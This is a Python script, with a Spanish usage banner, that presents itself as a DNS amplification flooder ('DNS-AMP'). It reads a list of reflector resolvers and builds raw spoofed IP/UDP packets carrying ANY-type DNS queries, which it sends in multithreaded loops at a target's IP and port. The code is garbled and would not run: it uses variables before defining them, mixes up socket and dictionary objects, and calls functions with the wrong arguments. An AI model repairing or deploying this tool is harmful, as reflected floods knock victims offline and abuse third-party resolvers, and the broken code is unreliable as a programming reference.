import socket
import struct
import threading
import random
import time
from colorama import Fore, init

init(autoreset=True)

logo = f"""
{Fore.GREEN}
 _____  _   _  _____              __  __ _____  
 |  __ \| \ | |/ ____|       /\   |  \/  |  __ \ 
 | |  | |  \| | (___ ______ /  \  | \  / | |__) |
 | |  | | . ` |\___ \______/ /\ \ | |\/| |  ___/ 
 | |__| | |\  |____) |    / ____ \| |  | | |     
 |_____/|_| \_|_____/    /_/    \_\_|  |_|_|     
{Fore.GREEN}
"""

print(logo)

MAX_PACKET_SIZE = 8192
PHI = 0x9e3779b9
PACKETS_PER_RESOLVER = 5
Q = [0] * 4096
c = 362436
head = None

class DNS_HEADER:
    def __init__(self):
        self.id = 0
        self.rd = 1
        self.tc = 0
        self.aa = 0
        self.opcode = 0
        self.qr = 0
        self.rcode = 0
        self.cd = 0
        self.ad = 0
        self.z = 0
        self.ra = 0
        self.q_count = 0
        self.ans_count = 0
        self.auth_count = 0
        self.add_count = 0

class QUESTION:
    def __init__(self):
        self.qtype = 0
        self.qclass = 0

class list:
    def __init__(self):
        self.data = None
        self.domain = ""
        self.line = 0
        self.next = None
        self.prev = None

def changeto_dns_name_format(dns, host):
    host += "."
    lock = 0

    for i in range(len(host)):
        if host[i] == ".":
            dns.append(i - lock)
            dns.extend(map(ord, host[lock:i]))
            lock = i + 1

    dns.append(0)

def init_rand(x):
    global Q, c
    Q = [0] * 4096
    c = 362436
    Q[0] = x
    Q[1] = x + PHI
    Q[2] = x + PHI + PHI
    for i in range(3, 4096):
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i

def rand_cmwc():
    global Q, c
    a = 18782
    i = 4095
    x = r = 0xfffffffe
    i = (i + 1) & 4095
    t = a * Q[i] + c
    c = t >> 32
    x = t + c
    if x < c:
        x += 1
        c += 1
    Q[i] = 0x7fffffff - x
    return Q[i]

def csum(buf):
    nwords = len(buf)
    sum = 0
    for word in buf:
        sum += word
    sum = (sum >> 16) + (sum & 0xffff)
    sum += (sum >> 16)
    return ~sum & 0xffff

def setup_udp_header(udph):
    pass

def flood(par1):
    td = par1
    print(f"Thread {td['thread_id']} started")
    str_packet = bytearray([0] * MAX_PACKET_SIZE)
    i_payload_size = 0
    sin = td['sin']
    list_node = td['list_node']
    i_port = td['port']
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    if s < 0:
        print(Fore.RED +"No se pudo abrir el socket crudo. Necesitas permisos root para ejecutar el programa!")
        exit(-1)
    init_rand(int(time.time()))
    str_packet = bytearray([0] * MAX_PACKET_SIZE)
    i_payload_size = 0
    iph = struct.Struct("!BBHHHBBH4s4s")
    udph = struct.Struct("!HHHH")
    sin.sin_port = i_port
    i_payload_size += 28
    udph = struct.Struct("!HHHH")
    str_packet[i_payload_size:i_payload_size + udph.size] = udph.pack(i_port, 53, 0, 0)
    i_payload_size += udph.size
    dns = DNS_HEADER()
    dns.q_count = socket.htons(1)
    dns.add_count = socket.htons(1)
    i_payload_size += 16
    sin.sin_port = socket.htons(i_port)
    iph = struct.Struct("!BBHHHBBH4s4s")
    i_payload_size += len(sin.sin_port) + len(sin.sin_addr)
    sin.sin_port = socket.htons(i_port)
    i_payload_size += len(sin.sin_port) + len(sin.sin_addr)
    i_payload_size += len(struct.pack("!BBH", 0x29, 0x23, 0x28))
    iph = struct.Struct("!BBHHHBBH4s4s")
    i_payload_size += len(ip_hdr)
    i_payload_size += len(udp_hdr)
    while True:
        time.sleep(0)
        list_node = list_node['next']
        i_payload_size += len(qname) + 1
        i_payload_size += len(struct.pack("!HH", 255, 1))
        i_payload_size += 11
        sin.sin_addr = list_node['data']['sin_addr']
        udph[2:4] = socket.htons(i_payload_size + 5 - iph.size)
        iph[10:12] = socket.htons(i_payload_size + 5)
        udph[0:2] = socket.htons(rand_cmwc() & 0xFFFF)
        i_payload_size = iph.size
        iph[10:12] = socket.htons(i_payload_size + 5)
        iph[4:8] = sin['sin_addr']
        iph[12:14] = sin['sin_port']
        ip_hdr = iph.pack(5, 4, 0, i_payload_size + 5, 54321, 0, 255, 0, sin['sin_addr'], socket.inet_aton("192.168.3.100"))
        ip_hdr[2:4] = struct.pack("H", csum([ip_hdr[x:x+2] for x in range(0, len(ip_hdr), 2)]))
        udp_hdr = udph.pack(i_port, 53, 0, 0)
        udp_hdr[6:8] = struct.pack("H", csum([ip_hdr[x:x+2] for x in range(0, len(ip_hdr), 2)]))
        s.sendto(ip_hdr + udp_hdr + str_packet[i_payload_size:i_payload_size + 11], (list_node['data']['sin_addr'], 0))
        i_payload_size += 11

def parse_resolver_line(line):
    global head
    ca_ip, ca_dns, _ = line.split()
    if head is None:
        head = list()
        head.data = None
        head.domain = ca_dns
        head.line = 0
        head.next = head
        head.prev = head
    else:
        new_node = list()
        new_node.data = None
        new_node.domain = ca_dns
        new_node.line = 0
        new_node.prev = head
        head.line = 0
        new_node.next = head.next
        head.next = new_node

def main():
    import sys
    if len(sys.argv) < 5:
        print(Fore.RED +"Parámetros inválidos!")
        print(Fore.YELLOW +"INSTRUCCIONES DE USO:")
        print(Fore.BLUE +"Use: python3 dns_flooder.py <IP/host de destino> <puerto a atacar> <archivo de reflejo (formato: IP DOMINIO>> <número de hilos a utilizar> <tiempo (opcional)>")
        print(Fore.BLUE +"Formato de archivo de reflejo: <IP>[espacio/tabulación]<DOMINIO>[espacio/tabulación]<IGNORADO>[espacio/tabulación]<IGNORADO>...")
        sys.exit(-1)

    global head
    head = None
    with open(sys.argv[3], "r") as list_fd:
        i_line = 0
        for line in list_fd:
            parse_resolver_line(line, i_line)
            i_line += 1

    i = 0
    num_threads = int(sys.argv[4])
    current = head.next
    thread = [None] * num_threads
    sin = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sin.sin_family = socket.AF_INET
    sin.sin_port = socket.htons(0)
    sin.sin_addr = socket.inet_aton(sys.argv[1])
    td = [dict(thread_id=i, sin=sin, list_node=current, port=int(sys.argv[2])) for i in range(num_threads)]
    print(f"Inundando {sys.argv[1]} en el puerto {int(sys.argv[2])}")
    for i in range(num_threads):
        thread[i] = threading.Thread(target=flood, args=(td[i],))
        thread[i].start()

    print("Iniciando inundacion...")
    if len(sys.argv) > 5:
        time.sleep(int(sys.argv[5]))
    else:
        while True:
            time.sleep(1)

if __name__ == "__main__":
    main()
